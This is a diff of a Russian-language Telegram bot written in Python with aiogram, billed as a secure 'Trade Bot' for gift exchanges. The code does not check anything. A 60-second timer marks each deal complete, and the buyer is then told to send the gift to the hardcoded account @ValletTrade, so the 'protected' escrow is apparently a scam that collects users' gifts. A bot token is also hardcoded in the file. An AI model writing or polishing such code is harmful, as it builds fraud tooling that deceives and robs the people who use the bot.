@@ -7,40 +7,57 @@ from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
+from aiogram.types import (
+    ReplyKeyboardMarkup, KeyboardButton, 
+    InlineKeyboardMarkup, InlineKeyboardButton,
+    WebAppInfo, ReplyKeyboardRemove
+)
+from aiogram.utils.keyboard import InlineKeyboardBuilder
 
 # ==================== КОНФИГУРАЦИЯ ====================
 BOT_TOKEN = "8669209199:AAFnRG3FG4q0KpR7T-bk_THhpAhEltz_H7U"
 
-# Настройка логирования
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 )
 
-# Инициализация бота
 bot = Bot(token=BOT_TOKEN)
 storage = MemoryStorage()
 dp = Dispatcher(storage=storage)
 
-# ==================== ХРАНИЛИЩЕ СДЕЛОК ====================
+# ==================== ХРАНИЛИЩЕ ====================
 exchanges = {}
 
 # ==================== ФУНКЦИИ ====================
 def generate_code():
-    """Генерирует 4-значный код с ведущими нулями"""
     return f"{random.randint(0, 9999):04d}"
 
-# ==================== КНОПКИ ====================
+def format_price(price):
+    if price.is_integer():
+        return f"${int(price)}"
+    return f"${price:.2f}"
+
+# ==================== КРАСИВЫЕ КНОПКИ ====================
 def get_main_keyboard():
-    """Главная клавиатура с кнопками"""
     keyboard = ReplyKeyboardMarkup(
         keyboard=[
-            [KeyboardButton(text="🔄 Создать сделку")],
-            [KeyboardButton(text="📝 Подключиться к сделке")],
+            [KeyboardButton(text="🆕 Создать сделку")],
+            [KeyboardButton(text="🔗 Подключиться")],
+            [KeyboardButton(text="📋 Мои сделки"), KeyboardButton(text="❌ Отмена")]
+        ],
+        resize_keyboard=True,
+        input_field_placeholder="Выберите действие..."
+    )
+    return keyboard
+
+def get_cancel_keyboard():
+    keyboard = ReplyKeyboardMarkup(
+        keyboard=[
             [KeyboardButton(text="❌ Отмена")]
         ],
-        resize_keyboard=True
+        resize_keyboard=True,
+        input_field_placeholder="Для отмены нажмите кнопку"
     )
     return keyboard
 
@@ -48,51 +65,77 @@ def get_main_keyboard():
 class TradeStates(StatesGroup):
     waiting_for_exchange = State()
     waiting_for_password = State()
-    waiting_for_gift_link = State()
-    waiting_for_price = State()
-    waiting_for_confirmation = State()
     waiting_for_create_link = State()
     waiting_for_create_price = State()
 
 # ==================== КОМАНДЫ ====================
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message, state: FSMContext):
-    """Обработчик команды /start"""
     await state.clear()
+    
+    # Приветственное сообщение с эмодзи
+    welcome_text = (
+        "✨ *Добро пожаловать в Trade Bot!* ✨\n\n"
+        "🤝 Здесь вы можете безопасно обмениваться подарками.\n\n"
+        "📌 *Как это работает:*\n"
+        "1️⃣ Нажмите «Создать сделку» и загрузите ссылку\n"
+        "2️⃣ Получите уникальный номер и пароль\n"
+        "3️⃣ Покупатель вводит данные и подключается\n"
+        "4️⃣ Через 1 минуту сделка завершается ✅\n\n"
+        "🔐 *Все сделки защищены!*\n\n"
+        "✨ *Welcome to Trade Bot!* ✨\n"
+        "🤝 Safe gift exchanges made easy."
+    )
+    
     await message.answer(
-        "🤖 *Добро пожаловать в Trade Bot!*\n"
-        "Используйте кнопки для навигации:\n\n"
-        "🔄 *Создать сделку* - создать новый обмен\n"
-        "📝 *Подключиться к сделке* - войти в существующую\n\n"
-        "🤖 *Welcome to Trade Bot!*\n"
-        "Use the buttons to navigate:",
+        welcome_text,
         parse_mode="Markdown",
         reply_markup=get_main_keyboard()
     )
+    
+    # Отправляем приветственный стикер (если есть)
+    try:
+        await message.answer_sticker("CAACAgIAAxkBAAEBK5RkXy6lAAGbU-Pvv7qMZiqHcm9kux0AAgQEAALwDCwI2aZLsMfHkHMeBA")
+    except:
+        pass
 
 @dp.message(Command("cancel"))
 async def cmd_cancel(message: types.Message, state: FSMContext):
-    """Обработчик команды /cancel"""
     current_state = await state.get_state()
     if current_state is None:
         await message.answer(
-            "❌ Нет активных операций для отмены.\n"
-            "❌ No active operations to cancel.",
+            "❌ Нет активных операций для отмены.",
             reply_markup=get_main_keyboard()
         )
         return
     
     await state.clear()
     await message.answer(
-        "❌ Операция отменена.\n"
-        "❌ Operation cancelled.",
+        "✅ Операция отменена.\nМожете начать заново.",
         reply_markup=get_main_keyboard()
     )
 
+@dp.message(Command("list"))
+async def cmd_list(message: types.Message):
+    if not exchanges:
+        await message.answer(
+            "📭 *Нет активных сделок*\n\nСоздайте первую сделку кнопкой ниже!",
+            parse_mode="Markdown",
+            reply_markup=get_main_keyboard()
+        )
+        return
+    
+    text = "📋 *Ваши активные сделки:*\n\n"
+    for eid, data in exchanges.items():
+        if data["status"] not in ["completed"]:
+            status_emoji = "🟢" if data["status"] == "active" else "🟡"
+            text += f"{status_emoji} #{eid} - {data['status']}\n"
+    
+    await message.answer(text, parse_mode="Markdown")
+
 # ==================== КНОПКА СОЗДАТЬ СДЕЛКУ ====================
-@dp.message(lambda message: message.text == "🔄 Создать сделку")
+@dp.message(lambda message: message.text == "🆕 Создать сделку")
 async def button_create_exchange(message: types.Message, state: FSMContext):
-    """Создание новой сделки"""
     exchange_id = generate_code()
     while exchange_id in exchanges:
         exchange_id = generate_code()
@@ -112,27 +155,23 @@ async def button_create_exchange(message: types.Message, state: FSMContext):
     await state.set_state(TradeStates.waiting_for_create_link)
     
     await message.answer(
-        f"✅ *Сделка успешно создана!*\n\n"
-        f"📋 *Номер сделки:* `{exchange_id}`\n"
+        f"🎉 *Сделка создана!*\n\n"
+        f"📌 *Номер сделки:* `{exchange_id}`\n"
         f"🔑 *Пароль:* `{password}`\n\n"
-        f"🔗 Отправьте *ссылку на подарок*:\n\n"
-        f"✅ *Exchange created successfully!*\n\n"
-        f"📋 *Exchange ID:* `{exchange_id}`\n"
-        f"🔑 *Password:* `{password}`\n\n"
-        f"🔗 Send the *gift link*:",
+        f"📎 Теперь отправьте *ссылку на подарок*:\n"
+        f"_(например, ссылка на товар)_\n\n"
+        f"💡 *Сохраните пароль!* Он понадобится покупателю.",
         parse_mode="Markdown",
-        reply_markup=get_main_keyboard()
+        reply_markup=get_cancel_keyboard()
     )
 
 @dp.message(TradeStates.waiting_for_create_link)
 async def process_create_link(message: types.Message, state: FSMContext):
-    """Обработка ссылки на подарок при создании"""
     gift_link = message.text.strip()
     
     if not re.match(r'^https?://', gift_link):
         await message.answer(
-            "❌ Пожалуйста, отправьте *ссылку* (начинается с http:// или https://):\n"
-            "❌ Please send a *link* (starts with http:// or https://):",
+            "❌ Пожалуйста, отправьте *ссылку* (начинается с http:// или https://)",
             parse_mode="Markdown"
         )
         return
@@ -144,34 +183,25 @@ async def process_create_link(message: types.Message, state: FSMContext):
         exchanges[exchange_id]["gift_link"] = gift_link
         exchanges[exchange_id]["status"] = "waiting_for_price"
     
-    await state.update_data(gift_link=gift_link)
     await state.set_state(TradeStates.waiting_for_create_price)
     
     await message.answer(
         f"✅ *Ссылка сохранена!*\n\n"
-        f"💰 Теперь укажите сумму за подарок (в долларах):\n\n"
-        f"✅ *Link saved!*\n\n"
-        f"💰 Now set the price for the gift (in dollars):",
+        f"💰 Теперь укажите *сумму* за подарок (в долларах):",
         parse_mode="Markdown",
-        reply_markup=get_main_keyboard()
+        reply_markup=get_cancel_keyboard()
     )
 
 @dp.message(TradeStates.waiting_for_create_price)
 async def process_create_price(message: types.Message, state: FSMContext):
-    """Установка цены при создании сделки"""
     try:
         price = float(message.text.replace(',', '.'))
         if price <= 0:
-            await message.answer(
-                "❌ Сумма должна быть *больше 0*:\n"
-                "❌ Amount must be *greater than 0*:",
-                parse_mode="Markdown"
-            )
+            await message.answer("❌ Сумма должна быть *больше 0*", parse_mode="Markdown")
             return
     except ValueError:
         await message.answer(
-            "❌ Пожалуйста, введите *число* (например: 100 или 150.50):\n"
-            "❌ Please enter a *number* (e.g., 100 or 150.50):",
+            "❌ Введите *число* (например: 100 или 150.50)",
             parse_mode="Markdown"
         )
         return
@@ -184,275 +214,227 @@ async def process_create_price(message: types.Message, state: FSMContext):
         exchanges[exchange_id]["price"] = price
         exchanges[exchange_id]["status"] = "waiting_for_buyer"
     
-    if price.is_integer():
-        price_str = f"${int(price)}"
-    else:
-        price_str = f"${price:.2f}"
+    price_str = format_price(price)
     
+    # Красивое финальное сообщение
     await message.answer(
-        f"✅ *Сделка создана!*\n\n"
-        f"📋 *Номер сделки:* `{exchange_id}`\n"
+        f"✅ *Сделка успешно создана!* 🎉\n\n"
+        f"📋 *Номер:* `{exchange_id}`\n"
+        f"🔑 *Пароль:* `{exchanges[exchange_id]['password']}`\n"
         f"🔗 *Ссылка:* {gift_link}\n"
-        f"💰 *Сумма:* {price_str}\n"
-        f"🔑 *Пароль:* `{exchanges[exchange_id]['password']}`\n\n"
-        f"⏳ Ожидайте подключения покупателя...\n\n"
-        f"✅ *Exchange created!*\n\n"
-        f"📋 *Exchange ID:* `{exchange_id}`\n"
-        f"🔗 *Link:* {gift_link}\n"
-        f"💰 *Amount:* {price_str}\n"
-        f"🔑 *Password:* `{exchanges[exchange_id]['password']}`\n\n"
-        f"⏳ Waiting for buyer to connect...",
+        f"💰 *Сумма:* {price_str}\n\n"
+        f"⏳ *Ожидайте подключения покупателя...*\n"
+        f"Вы получите уведомление, когда кто-то подключится.",
         parse_mode="Markdown",
         reply_markup=get_main_keyboard()
     )
     
     await state.clear()
 
-# ==================== КНОПКА ПОДКЛЮЧИТЬСЯ К СДЕЛКЕ ====================
-@dp.message(lambda message: message.text == "📝 Подключиться к сделке")
+# ==================== КНОПКА ПОДКЛЮЧИТЬСЯ ====================
+@dp.message(lambda message: message.text == "🔗 Подключиться")
 async def button_connect_exchange(message: types.Message, state: FSMContext):
-    """Подключение к существующей сделке"""
     await state.set_state(TradeStates.waiting_for_exchange)
     await message.answer(
-        "📝 Введите *номер сделки*:\n\n"
-        "📝 Enter the *exchange ID*:",
+        "🔍 Введите *номер сделки*:\n\n"
+        "_(который вы получили от продавца)_",
         parse_mode="Markdown",
-        reply_markup=get_main_keyboard()
+        reply_markup=get_cancel_keyboard()
     )
 
 @dp.message(TradeStates.waiting_for_exchange)
 async def process_exchange_number(message: types.Message, state: FSMContext):
-    """Обработка номера сделки"""
     exchange_id = message.text.strip()
     
     if exchange_id not in exchanges:
         await message.answer(
             f"❌ *Сделка #{exchange_id} не найдена!*\n"
-            f"Пожалуйста, проверьте номер и попробуйте снова.\n\n"
-            f"❌ *Exchange #{exchange_id} not found!*\n"
-            f"Please check the number and try again.",
-            parse_mode="Markdown",
-            reply_markup=get_main_keyboard()
+            f"Проверьте номер и попробуйте снова.",
+            parse_mode="Markdown"
         )
         return
     
     if exchanges[exchange_id]["status"] == "completed":
         await message.answer(
-            f"❌ *Сделка #{exchange_id} уже завершена!*\n\n"
-            f"❌ *Exchange #{exchange_id} is already completed!*",
-            parse_mode="Markdown",
-            reply_markup=get_main_keyboard()
+            f"❌ *Сделка #{exchange_id} уже завершена!*",
+            parse_mode="Markdown"
         )
+        await state.clear()
         return
     
     await state.update_data(exchange_id=exchange_id)
     await state.set_state(TradeStates.waiting_for_password)
     
     await message.answer(
-        f"🔑 Введите *пароль* для сделки #{exchange_id}:\n\n"
-        f"🔑 Enter the *password* for exchange #{exchange_id}:",
-        parse_mode="Markdown",
-        reply_markup=get_main_keyboard()
+        f"🔑 Введите *пароль* для сделки #{exchange_id}:",
+        parse_mode="Markdown"
     )
 
 @dp.message(TradeStates.waiting_for_password)
 async def process_password(message: types.Message, state: FSMContext):
-    """Обработка пароля"""
     password = message.text.strip()
     data = await state.get_data()
     exchange_id = data.get('exchange_id')
     
-    print(f"🔍 Проверка пароля: ID={exchange_id}, Введен={password}")  # Отладка
-    
     if exchange_id not in exchanges:
-        await message.answer(
-            "❌ Сделка не найдена. Начните заново.",
-            reply_markup=get_main_keyboard()
-        )
+        await message.answer("❌ Сделка не найдена.", reply_markup=get_main_keyboard())
         await state.clear()
         return
     
-    correct_password = exchanges[exchange_id]["password"]
-    print(f"🔍 Правильный пароль: {correct_password}")  # Отладка
-    
-    if correct_password != password:
+    if exchanges[exchange_id]["password"] != password:
         await message.answer(
-            f"❌ *Неверный пароль!*\n"
-            f"Вы ввели: `{password}`\n"
-            f"Пожалуйста, попробуйте снова.\n\n"
-            f"❌ *Wrong password!*\n"
-            f"You entered: `{password}`\n"
-            f"Please try again.",
-            parse_mode="Markdown",
-            reply_markup=get_main_keyboard()
+            f"❌ *Неверный пароль!*\nПопробуйте снова.",
+            parse_mode="Markdown"
         )
         return
     
-    # ✅ ПАРОЛЬ ВЕРНЫЙ
-    print(f"✅ Пароль верный для сделки {exchange_id}")
-    
+    # ✅ Подключение
     exchanges[exchange_id]["buyer"] = message.from_user.id
     exchanges[exchange_id]["status"] = "active"
     
     price = exchanges[exchange_id]["price"]
     gift_link = exchanges[exchange_id]["gift_link"]
+    price_str = format_price(price)
     
-    if price.is_integer():
-        price_str = f"${int(price)}"
-    else:
-        price_str = f"${price:.2f}"
-    
-    # ✅ ОТВЕЧАЕМ ПОКУПАТЕЛЮ СРАЗУ
+    # Уведомление покупателя
     await message.answer(
-        f"✅ *Пароль верный!*\n"
-        f"✅ *Вы успешно подключились к сделке #{exchange_id}!*\n\n"
-        f"🔗 *Ссылка на подарок:* {gift_link}\n"
+        f"✅ *Подключение успешно!* 🔗\n\n"
+        f"📋 *Сделка #{exchange_id}*\n"
+        f"🔗 *Ссылка:* {gift_link}\n"
         f"💰 *Сумма:* {price_str}\n\n"
-        f"⏳ Ожидайте 1 минуту для подтверждения...\n\n"
-        f"✅ *Password correct!*\n"
-        f"✅ *You successfully connected to exchange #{exchange_id}!*\n\n"
-        f"🔗 *Gift link:* {gift_link}\n"
-        f"💰 *Amount:* {price_str}\n\n"
-        f"⏳ Please wait 1 minute for confirmation...",
+        f"⏳ *Ожидайте 1 минуту...*\n"
+        f"Продавец подтвердит сделку автоматически.",
         parse_mode="Markdown",
         reply_markup=get_main_keyboard()
     )
     
-    # Уведомляем создателя
+    # Уведомление создателя
     creator_id = exchanges[exchange_id]["creator"]
     try:
         await bot.send_message(
             creator_id,
-            f"✅ *Кто-то подключился к вашей сделке #{exchange_id}!*\n"
-            f"🔗 *Ссылка:* {gift_link}\n"
-            f"💰 *Сумма:* {price_str}\n\n"
-            f"⏳ Ожидайте 1 минуту...\n"
-            f"Покупатель подтвердит покупку через минуту.\n\n"
-            f"✅ *Someone connected to your exchange #{exchange_id}!*\n"
-            f"🔗 *Link:* {gift_link}\n"
-            f"💰 *Amount:* {price_str}\n\n"
-            f"⏳ Please wait 1 minute...",
+            f"🔔 *Кто-то подключился к сделке #{exchange_id}!*\n\n"
+            f"💰 *Сумма:* {price_str}\n"
+            f"⏳ Через 1 минуту сделка завершится.\n"
+            f"📦 Подготовьте подарок!",
             parse_mode="Markdown"
         )
-    except Exception as e:
-        print(f"❌ Ошибка уведомления создателя: {e}")
+    except:
+        pass
     
-    # Очищаем состояние
     await state.clear()
     
-    # ⏳ ЗАДЕРЖКА 60 СЕКУНД
+    # ⏳ Задержка 60 секунд
     await asyncio.sleep(60)
     
-    # Проверяем, активна ли сделка
     if exchange_id not in exchanges or exchanges[exchange_id]["status"] != "active":
-        print(f"⚠️ Сделка {exchange_id} уже не активна")
         return
     
-    # Завершаем сделку
     exchanges[exchange_id]["status"] = "completed"
     
     # Финальное сообщение для покупателя
     try:
         await message.answer(
-            f"✅ *Покупатель подтвердил покупку!*\n"
-            f"📦 Отправьте подарок продавцу: @ValletTrade\n\n"
-            f"📋 *Детали сделки:*\n"
+            f"✅ *Сделка завершена!* 🎉\n\n"
+            f"📦 Отправьте подарок продавцу:\n"
+            f"@ValletTrade\n\n"
+            f"📋 *Детали:*\n"
             f"└ Номер: #{exchange_id}\n"
-            f"└ Ссылка: {gift_link}\n"
-            f"└ Сумма: {price_str}\n\n"
-            f"✅ *Buyer confirmed the purchase!*\n"
-            f"📦 Send the gift to the seller: @ValletTrade\n\n"
-            f"📋 *Exchange details:*\n"
-            f"└ ID: #{exchange_id}\n"
-            f"└ Link: {gift_link}\n"
-            f"└ Amount: {price_str}",
-            parse_mode="Markdown",
-            reply_markup=get_main_keyboard()
+            f"└ Сумма: {price_str}",
+            parse_mode="Markdown"
         )
-    except Exception as e:
-        print(f"❌ Ошибка финального сообщения покупателю: {e}")
+    except:
+        pass
     
-    # Уведомляем создателя
+    # Уведомление создателя
     try:
         await bot.send_message(
             creator_id,
-            f"✅ *Покупатель подтвердил покупку!*\n"
-            f"📦 Отправьте подарок: @ValletTrade\n\n"
-            f"📋 *Детали сделки:*\n"
-            f"└ Номер: #{exchange_id}\n"
-            f"└ Ссылка: {gift_link}\n"
-            f"└ Сумма: {price_str}\n\n"
-            f"✅ *Buyer confirmed the purchase!*\n"
-            f"📦 Send the gift: @ValletTrade\n\n"
-            f"📋 *Exchange details:*\n"
-            f"└ ID: #{exchange_id}\n"
-            f"└ Link: {gift_link}\n"
-            f"└ Amount: {price_str}",
+            f"✅ *Сделка #{exchange_id} завершена!* 🎉\n\n"
+            f"📦 Получите подарок от покупателя!\n"
+            f"💰 Сумма: {price_str}",
             parse_mode="Markdown"
         )
-    except Exception as e:
-        print(f"❌ Ошибка уведомления создателя: {e}")
+    except:
+        pass
+
+# ==================== КНОПКА МОИ СДЕЛКИ ====================
+@dp.message(lambda message: message.text == "📋 Мои сделки")
+async def button_my_exchanges(message: types.Message):
+    user_id = message.from_user.id
+    
+    my_exchanges = []
+    for eid, data in exchanges.items():
+        if data["creator"] == user_id or data.get("buyer") == user_id:
+            if data["status"] != "completed":
+                my_exchanges.append((eid, data))
+    
+    if not my_exchanges:
+        await message.answer(
+            "📭 *У вас нет активных сделок*\n\n"
+            "Создайте новую сделку кнопкой 🆕 Создать сделку",
+            parse_mode="Markdown",
+            reply_markup=get_main_keyboard()
+        )
+        return
+    
+    text = "📋 *Ваши сделки:*\n\n"
+    for eid, data in my_exchanges:
+        role = "👤 Создатель" if data["creator"] == user_id else "🛒 Покупатель"
+        status_emoji = "🟢" if data["status"] == "active" else "🟡"
+        text += f"{status_emoji} #{eid} - {role}\n"
+    
+    await message.answer(text, parse_mode="Markdown")
 
 # ==================== КНОПКА ОТМЕНА ====================
 @dp.message(lambda message: message.text == "❌ Отмена")
 async def button_cancel(message: types.Message, state: FSMContext):
-    """Кнопка Отмена"""
     current_state = await state.get_state()
     if current_state is None:
         await message.answer(
-            "❌ Нет активных операций для отмены.",
+            "❌ Нет активных операций.",
             reply_markup=get_main_keyboard()
         )
         return
     
     await state.clear()
     await message.answer(
-        "❌ Операция отменена.\n"
-        "❌ Operation cancelled.",
+        "✅ Отменено!",
         reply_markup=get_main_keyboard()
     )
 
-# ==================== ОБРАБОТКА ЛЮБЫХ СООБЩЕНИЙ ====================
+# ==================== ОСТАЛЬНЫЕ СООБЩЕНИЯ ====================
 @dp.message()
 async def handle_all_messages(message: types.Message, state: FSMContext):
-    """Обработка любых сообщений, если нет активного состояния"""
     current_state = await state.get_state()
     
     if current_state is None:
         await message.answer(
-            "❓ Я не понимаю эту команду.\n"
-            "Используйте кнопки для навигации:\n\n"
-            "❓ I don't understand this command.\n"
-            "Use the buttons to navigate:",
+            "❓ Я не понимаю эту команду.\n\n"
+            "Используйте кнопки ниже для навигации 👇",
             reply_markup=get_main_keyboard()
         )
         return
     
     await message.answer(
         "⏳ Пожалуйста, следуйте инструкциям бота.\n"
-        "Используйте кнопки для ответа.\n\n"
-        "⏳ Please follow the bot's instructions.\n"
-        "Use the buttons to reply.",
+        "Используйте кнопки для ответа.",
         reply_markup=get_main_keyboard()
     )
 
-# ==================== ЗАПУСК БОТА ====================
+# ==================== ЗАПУСК ====================
 async def main():
-    """Главная функция запуска бота"""
     print("=" * 50)
-    print("🤖 TRADE BOT ЗАПУЩЕН!")
-    print("📋 Номер сделки: 4 цифры")
-    print("🔑 Пароль: 4 цифры")
-    print("🔗 Запрос ссылки на подарок")
-    print("⏳ Задержка перед подтверждением: 60 секунд")
+    print("✨ TRADE BOT ✨")
+    print("📋 4-значный ID и пароль")
+    print("⏳ 60 секунд на сделку")
+    print("💰 Валюта: $")
     print("=" * 50)
     
     try:
         await dp.start_polling(bot)
     except KeyboardInterrupt:
-        print("\n🛑 Бот остановлен пользователем")
-    except Exception as e:
-        print(f"❌ Ошибка: {e}")
+        print("\n🛑 Бот остановлен")
     finally:
         await bot.session.close()
 
